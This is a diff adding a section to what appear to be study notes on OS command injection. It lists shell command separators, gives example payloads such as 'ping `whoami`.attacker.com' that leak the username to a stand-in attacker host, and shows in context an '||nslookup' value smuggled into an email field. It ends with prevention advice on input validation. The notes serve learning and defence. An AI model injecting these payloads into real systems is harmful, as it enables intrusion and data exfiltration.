@@ -221,18 +221,54 @@ csrf=nM9nUcG8R4kScScJGBZNrQLLXGt5vm1U&name=a&email=||nslookup crudrnshcmhythtyyw
 
 
 
+---
+
+
+## Ways of injecting OS commands
+
+> You can use a number of shell metacharacters to perform OS command injection attacks.
+
+A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems: 
+
+```bash
+
+    &
+    &&
+    |
+    ||
+
+```
 
 
 
+On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command: 
+
+
+```bash
+ping `whoami`.attacker.com
+# أو
+ping $(whoami).attacker.com
+
+```
 
 
 
+<details>
+  <summary>How to prevent OS command injection attacks</summary>
+
+> ### The most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code.
+
+> ### If you have to call out to OS commands with user-supplied input, then you must perform strong input validation. Some examples of effective validation include:  
 
 
 
+   * Validating against a whitelist of permitted values.
+   * Validating that the input is a number.
+   * Validating that the input contains only alphanumeric characters, no other syntax or whitespace.
 
 
-
+  
+</details>
 
 
 
